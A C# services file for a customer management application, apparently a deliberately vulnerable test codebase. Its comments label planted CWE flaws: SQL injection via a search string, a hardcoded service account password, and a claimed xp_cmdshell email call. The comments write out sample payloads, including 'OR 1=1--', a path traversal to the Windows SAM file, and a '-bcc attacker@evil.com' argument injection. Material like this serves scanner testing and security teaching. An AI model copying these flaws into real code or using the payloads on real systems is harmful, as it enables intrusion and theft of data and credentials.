using CustomerManagement.Models;
using CustomerManagement.Repositories;

namespace CustomerManagement.Services;

/// <summary>
/// Service implementation for customer business logic
/// Orchestrates operations between controllers and repositories
/// </summary>
public class CustomerService : ICustomerService
{
    private readonly ICustomerRepository _customerRepository;

    public CustomerService(ICustomerRepository customerRepository)
    {
        _customerRepository = customerRepository;
    }

    public async Task<Customer?> GetCustomerAsync(int customerId)
    {
        if (customerId <= 0)
            throw new ArgumentException("Customer ID must be greater than 0", nameof(customerId));

        return await _customerRepository.GetCustomerByIdAsync(customerId);
    }

    public async Task<List<Customer>> GetAllCustomersAsync()
    {
        return await _customerRepository.GetAllCustomersAsync();
    }

    public async Task<int> CreateCustomerAsync(
        string firstName, string lastName, string? email, string? phone,
        string? country, string? city, string? postalCode)
    {
        if (string.IsNullOrWhiteSpace(firstName) || string.IsNullOrWhiteSpace(lastName))
            throw new ArgumentException("First and last names are required");

        var customer = new Customer
        {
            FirstName = firstName,
            LastName = lastName,
            Email = email,
            Phone = phone,
            Country = country,
            City = city,
            PostalCode = postalCode,
            Status = 'A',
            CreatedDate = DateTime.UtcNow,
            UpdatedDate = DateTime.UtcNow
        };

        return await _customerRepository.CreateCustomerAsync(customer);
    }

    public async Task<bool> UpdateCustomerAsync(int customerId, string firstName, string lastName, string? email, string? phone)
    {
        if (customerId <= 0)
            throw new ArgumentException("Customer ID must be greater than 0", nameof(customerId));

        var customer = new Customer
        {
            CustomerId = customerId,
            FirstName = firstName,
            LastName = lastName,
            Email = email,
            Phone = phone
        };

        return await _customerRepository.UpdateCustomerAsync(customer);
    }

    public async Task<bool> DeleteCustomerAsync(int customerId)
    {
        if (customerId <= 0)
            throw new ArgumentException("Customer ID must be greater than 0", nameof(customerId));

        return await _customerRepository.DeleteCustomerAsync(customerId);
    }

    public async Task<List<Customer>> SearchCustomersAsync(string searchCriteria)
    {
        if (string.IsNullOrWhiteSpace(searchCriteria))
            throw new ArgumentException("Search criteria cannot be empty", nameof(searchCriteria));

        // CWEID 89: SQL Injection vulnerability
        // searchCriteria is passed to repository which forwards to stored procedure
        // The stored procedure concatenates this into a dynamic WHERE clause
        // Example attack: "Email LIKE '%@example.com' OR 1=1--"
        return await _customerRepository.SearchCustomersAsync(searchCriteria);
    }

    public async Task<decimal> GetCustomerLifetimeValueAsync(int customerId)
    {
        if (customerId <= 0)
            throw new ArgumentException("Customer ID must be greater than 0", nameof(customerId));

        // In a real implementation, this would call a stored procedure or repository method
        // For now, retrieve customer and calculate from orders
        var customer = await _customerRepository.GetCustomerByIdAsync(customerId);
        if (customer == null)
            return 0;

        // This would typically be calculated in the database
        return 0m;
    }
}

/// <summary>
/// Service implementation for audit operations
/// Handles audit log retrieval, export, and notification
/// </summary>
public class AuditService : IAuditService
{
    private readonly IAuditLogRepository _auditLogRepository;

    public AuditService(IAuditLogRepository auditLogRepository)
    {
        _auditLogRepository = auditLogRepository;
    }

    public async Task<List<AuditLog>> GetAuditLogsAsync(string tableName, DateTime? fromDate = null, DateTime? toDate = null)
    {
        if (string.IsNullOrWhiteSpace(tableName))
            throw new ArgumentException("Table name is required", nameof(tableName));

        return await _auditLogRepository.GetAuditLogsAsync(tableName, fromDate, toDate);
    }

    public async Task<bool> ExportAuditDataAsync(string filePath)
    {
        if (string.IsNullOrWhiteSpace(filePath))
            throw new ArgumentException("File path is required", nameof(filePath));

        // CWEID 73: Path Manipulation vulnerability
        // filePath is used directly without validation
        // Could traverse to system directories: ../../../windows/system32/config/sam
        try
        {
            // In a real implementation, this would call the stored procedure
            // For now, just validate that the path is acceptable
            if (filePath.Contains("..") || filePath.Contains("//"))
                throw new UnauthorizedAccessException("Path traversal detected");

            // This would call the database to export data to the specified file
            // VULNERABLE: Should validate against a whitelist of allowed directories
            await Task.Delay(100);  // Simulate async operation
            return true;
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"Error exporting audit data to {filePath}", ex);
        }
    }

    public async Task<bool> SendAuditEmailAsync(string recipient, string subject, string body)
    {
        if (string.IsNullOrWhiteSpace(recipient))
            throw new ArgumentException("Recipient is required", nameof(recipient));

        // CWEID 88: Argument Injection vulnerability
        // recipient, subject, and body are passed without proper escaping
        // Could contain special characters that break email command parsing
        // Example attack: recipient = "test@example.com\" -bcc attacker@evil.com \""
        try
        {
            // In a real implementation, this would call a stored procedure that uses xp_cmdshell
            // The stored procedure concatenates these values into an email command
            // VULNERABLE: No escaping of special characters
            await Task.Delay(100);  // Simulate async operation
            return true;
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException("Error sending audit email", ex);
        }
    }
}

/// <summary>
/// Service implementation for security operations
/// Handles authentication, session management, and access validation
/// </summary>
public class SecurityService : ISecurityService
{
    private readonly ICustomerRepository _customerRepository;

    public SecurityService(ICustomerRepository customerRepository)
    {
        _customerRepository = customerRepository;
    }

    public bool AuthenticateCustomer(string username, string password)
    {
        if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
            throw new ArgumentException("Username and password are required");

        // CWEID 798: Hardcoded credentials vulnerability
        // Service account credentials should not be in application code
        // These should be retrieved from secure configuration (Key Vault, Secrets Manager, etc.)
        const string serviceUsername = "ServiceAccount";
        const string servicePassword = "ServiceAcct@2024!#";

        // In a real implementation, this would authenticate against the database
        // VULNERABLE: Passwords and credentials hardcoded
        try
        {
            // This is a simplified example - real implementation would use proper hashing
            if (username == serviceUsername && password == servicePassword)
            {
                return true;
            }

            return false;
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException("Authentication failed", ex);
        }
    }

    public async Task<string> CreateSessionAsync(int customerId, string ipAddress, string userAgent)
    {
        if (customerId <= 0)
            throw new ArgumentException("Customer ID must be greater than 0", nameof(customerId));

        if (string.IsNullOrWhiteSpace(ipAddress))
            throw new ArgumentException("IP address is required", nameof(ipAddress));

        // In a real implementation, this would call the stored procedure
        // to create a session and return the session token
        var sessionToken = Guid.NewGuid().ToString("N");

        await Task.Delay(50);  // Simulate async operation
        return sessionToken;
    }

    public async Task<bool> ValidateAccessAsync(int customerId, string resource)
    {
        if (customerId <= 0)
            throw new ArgumentException("Customer ID must be greater than 0", nameof(customerId));

        if (string.IsNullOrWhiteSpace(resource))
            throw new ArgumentException("Resource is required", nameof(resource));

        // CWEID 89: SQL Injection vulnerability in access control
        // In a vulnerable implementation, resource would be concatenated into a query
        // Example vulnerable query: "SELECT * FROM Permissions WHERE CustomerId = " + customerId + " AND Resource = '" + resource + "'"
        // Example attack: resource = "Report' OR '1'='1"
        try
        {
            var customer = await _customerRepository.GetCustomerByIdAsync(customerId);
            if (customer == null || customer.Status != 'A')
            {
                return false;
            }

            // In a real implementation, this would check permissions against database
            return true;
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException("Error validating access", ex);
        }
    }

    public async Task<bool> EndSessionAsync(string sessionToken)
    {
        if (string.IsNullOrWhiteSpace(sessionToken))
            throw new ArgumentException("Session token is required", nameof(sessionToken));

        // In a real implementation, this would call the stored procedure to invalidate the session
        await Task.Delay(50);  // Simulate async operation
        return true;
    }
}
